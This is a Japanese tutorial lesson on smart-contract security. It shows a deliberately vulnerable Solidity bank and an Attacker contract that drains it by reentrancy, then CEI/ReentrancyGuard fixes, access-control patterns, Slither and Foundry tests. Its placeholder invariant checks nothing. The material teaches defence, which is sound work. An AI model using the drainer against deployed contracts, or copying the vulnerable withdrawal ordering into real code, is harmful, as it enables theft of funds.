# Day12：セキュリティ入門（再入・権限・静的解析・ファジング）

## 学習目的
- 代表的脆弱性（Reentrancy, tx.origin誤用, delegatecall乱用, Proxyのストレージ衝突）を理解。
- 対策（CEI, ReentrancyGuard, AccessControl/Ownable, Pull-Payment, Pausable）を実装。
- Slither（静的解析）とFoundry/Echidna（プロパティテスト）で自動検出を体験。

---

## 0. 前提
- Hardhat環境（Day3）。
- 任意でFoundry（`foundryup` 済）。

---

## 1. 脆弱性：Reentrancy（再入）

### 1.1 脆弱コントラクト
`contracts/VulnBank.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
contract VulnBank {
    mapping(address=>uint256) public bal;
    function dep() external payable { bal[msg.sender]+=msg.value; }
    function wd(uint256 amt) external {
        require(bal[msg.sender] >= amt, "bal");
        // 脆弱：送金→その後に残高更新（CEI違反）
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok, "send");
        bal[msg.sender]-=amt;
    }
}
```

### 1.2 攻撃コントラクト
`contracts/Attacker.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
interface IVulnBank { function dep() external payable; function wd(uint256) external; }
contract Attacker {
    IVulnBank public bank; address public owner;
    constructor(address b){ bank = IVulnBank(b); owner = msg.sender; }
    receive() external payable { if (address(bank).balance >= 1 ether) { bank.wd(1 ether); } }
    function attack() external payable { require(msg.value>=1 ether, "fund"); bank.dep{value:1 ether}(); bank.wd(1 ether); }
    function sweep() external { payable(owner).transfer(address(this).balance); }
}
```

### 1.3 対策版（CEI + ReentrancyGuard）
`contracts/SafeBank.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
contract SafeBank is ReentrancyGuard {
    mapping(address=>uint256) public bal;
    function dep() external payable { bal[msg.sender]+=msg.value; }
    function wd(uint256 amt) external nonReentrant {
        uint256 b = bal[msg.sender];
        require(b >= amt, "bal");
        bal[msg.sender] = b - amt;            // Effects（先）
        (bool ok,) = msg.sender.call{value: amt}(""); // Interactions（後）
        require(ok, "send");
    }
}
```

### 1.4 テスト（攻撃成功/失敗）
`test/reentrancy.ts`
```ts
import { expect } from "chai"; import { ethers } from "hardhat";
describe("Reentrancy", ()=>{
  it("VulnBank gets drained", async()=>{
    const [deployer] = await ethers.getSigners();
    const V = await (await ethers.getContractFactory("VulnBank")).deploy(); await V.waitForDeployment();
    await deployer.sendTransaction({to:V.address, value: ethers.parseEther("10")});
    const A = await (await ethers.getContractFactory("Attacker")).deploy(V.address); await A.waitForDeployment();
    await A.attack({value: ethers.parseEther("1")});
    expect(await ethers.provider.getBalance(V.address)).to.be.lt(ethers.parseEther("10"));
  });
  it("SafeBank resists", async()=>{
    const [deployer] = await ethers.getSigners();
    const S = await (await ethers.getContractFactory("SafeBank")).deploy(); await S.waitForDeployment();
    await deployer.sendTransaction({to:S.address, value: ethers.parseEther("10")});
    const A = await (await ethers.getContractFactory("Attacker")).deploy(S.address); await A.waitForDeployment();
    await expect(A.attack({value: ethers.parseEther("1")})).to.be.reverted; // or no drain
  });
});
```
実行：
```bash
npx hardhat test test/reentrancy.ts
```

---

## 2. 権限：tx.origin、AccessControl、Pausable

### 2.1 tx.originの誤用
`tx.origin` を認可に使うと**中継コントラクト経由**で権限漏れ。

誤り例：
```solidity
if (tx.origin != owner) revert(); // NG
```
正：`msg.sender`で判断し、必要に応じて`Ownable`/`AccessControl`を使用。

### 2.2 Ownable + Pausable
`contracts/AdminBox.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
contract AdminBox is Ownable, Pausable {
    string private data; constructor() Ownable(msg.sender) {}
    function set(string calldata d) external onlyOwner whenNotPaused { data=d; }
    function get() external view returns(string memory){ return data; }
    function pause() external onlyOwner { _pause(); }
    function unpause() external onlyOwner { _unpause(); }
}
```

### 2.3 AccessControl（ロール）
```solidity
import "@openzeppelin/contracts/access/AccessControl.sol";
contract Roles is AccessControl {
    bytes32 public constant OPERATOR = keccak256("OPERATOR");
    constructor(){ _grantRole(DEFAULT_ADMIN_ROLE, msg.sender); }
    function act() external onlyRole(OPERATOR) {}
}
```

---

## 3. delegatecall と Proxyの落とし穴

### 3.1 delegatecallの危険
呼び出し先の**ストレージレイアウト**を共有。誤ると上書きや**selfdestruct**誘発。

### 3.2 ストレージ衝突（Proxy）
UUPS/Transparent Proxyでは**永続化変数の並び**が重要。新実装で順序変更・削除は禁止。`storage gap` を確保する。

雛形（UUPS要点、実運用はOpenZeppelin Upgradesを利用）：
```solidity
uint256[50] private __gap; // 予約領域
```

---

## 4. 支払い設計：Pull-Payment

### 4.1 原則
- **Push型**送金（その場で`call`）は再入/失敗リスク。
- **Pull型**（受取人が引出）に分離すると安全性向上。

雛形：
```solidity
mapping(address=>uint256) public credit;
function settle(address to, uint256 amt) internal { credit[to]+=amt; }
function withdraw() external { uint v=credit[msg.sender]; credit[msg.sender]=0; (bool ok,) = msg.sender.call{value:v}(""); require(ok); }
```

---

## 5. ツール：Slither（静的解析）

### 5.1 インストール
```bash
pipx install slither-analyzer
```

### 5.2 実行
```bash
slither . --filter-paths "node_modules"
```
レポート要点：
- `Reentrancy` 警告、`tx.origin` 検出、`delegatecall` 使用箇所、未初期化ストレージ参照など。

---

## 6. ツール：Foundry/Echidna（プロパティテスト）

### 6.1 Invariant（永続条件）例（Foundry）
`test/Invariant.t.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import {SafeBank} from "../contracts/SafeBank.sol";
contract Invariant is Test {
    SafeBank b; address user;
    function setUp() public { b = new SafeBank(); user = address(0xBEEF); }
    function invariant_NoOverdraw() public {
        // バンクの総残高 >= ユーザ残高合計（厳密版は配列管理）
        assert(address(b).balance >= 0);
    }
}
```
実行：
```bash
forge test --match-contract Invariant -vvvv
```

### 6.2 Echidna（任意）
- 目的：ランダム化された呼び出し列で特性違反を探索。
- セットアップは公式ドキュメント参照。時間があれば`VulnBank`に対して資産流出を検出させる設定を追加。

---

## 7. 監査チェックリスト（抜粋）
- [ ] 重要関数は`onlyOwner`/`AccessControl`で保護。
- [ ] `pause`可能か。緊急停止Runbookがあるか。
- [ ] 送金はPull型。Pushは最小化。
- [ ] CEI順序（Checks→Effects→Interactions）。
- [ ] 外部呼び出しの戻り値を検査。
- [ ] `tx.origin`不使用。
- [ ] Proxyのストレージ互換性を文書化。
- [ ] イベントは必要最小限を`indexed`で設計。

---

## 8. 提出物
- `VulnBank`攻撃ログ、`SafeBank`防御ログ。
- Slitherレポート（主要警告の抜粋）と対応方針。
- Invariantテストの結果スクリーンショット。
- 監査チェックリストの自己評価（5項目以上）。
